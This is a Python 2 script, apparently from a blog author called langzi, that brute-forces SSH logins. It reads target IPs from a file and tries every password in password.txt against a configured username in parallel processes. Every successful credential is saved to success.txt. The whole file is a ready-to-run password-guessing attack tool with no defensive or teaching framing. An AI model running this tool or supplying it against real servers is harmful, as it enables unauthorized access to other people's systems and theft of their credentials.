# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import time
import multiprocessing
import ConfigParser
import paramiko
paramiko.util.logging.getLogger('paramiko.transport').addHandler(paramiko.util.logging.NullHandler())
timeout=5

def success(x):
    with open('success.txt', 'a+')as a:
        a.write(x + "\n")

def brute_ssh(ip,username,passwords,port):
    for password in passwords:
        print 'Checking>>>SSH:' + ip + '@' + username + ':' + password + ':'  + str(port)
        try:
            # telnetlib.Telnet(ip, 111, timeout=2)#判断额外端口的
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
            ssh.connect(ip, port, '', '', timeout=timeout)
            ssh.close()
        except Exception as e:
            if 'Authentication' in str(e):  # 捕获所有的异常，根据返回信息，判断是否是ssh的，决定是否往下爆破。
                try:
                    ssh.connect(ip, port, username, password, timeout=timeout)
                    # print(colored(ip + ' ' + us + ' ' + pa + ' ' + '连接成功~~~~~~~', 'red'))
                    # open(outfile, 'a', encoding='utf-8').write(ip + ' ' + us + ' ' + pa + '\n')  # 成功了，就写入文本
                    # data_text = ip + ' ' + us + ' ' + pa
                    ssh.close()
                    print 'SSH:'+ip + ':' + str(port) + '|' + username + ':' + password
                    success('SSH:'+ip + ':' + str(port) + '|' + username + ':' + password)
                    return 'SSH'
                except Exception as e:
                    ssh.close()
                    #print e
            else:
                #print e
                #return None
                pass

if __name__ == '__main__':
    multiprocessing.freeze_support()

    cfg = ConfigParser.ConfigParser()
    cfg.read('Config.ini')
    user = cfg.get("Config", "user")
    thread_s = int(cfg.get("Config", "threads"))
    port = int(cfg.get("Config", "port"))
    print '\n\n     SSH SCAN'
    print '         USER:' + user
    print '         PORT:' + str(port)
    print '         THREADS:' + str(thread_s)

    New_start = raw_input('INPUT IP LIST TXT:')  # line:190
    New_start = New_start.replace('"', '').replace("'", '')
    IP_list = list(set([x.strip() for x in open(New_start,'r').readlines()]))

    Password_list_ = list(set([x.strip() for x in open('password.txt','r').readlines()]))

    p = multiprocessing.Pool(thread_s)

    for ip in IP_list:
        p.apply_async(brute_ssh, args=(ip,user,Password_list_,port))
    p.close()
    p.join()


# brute_ssh(ip='',username='root',password='',port=26624)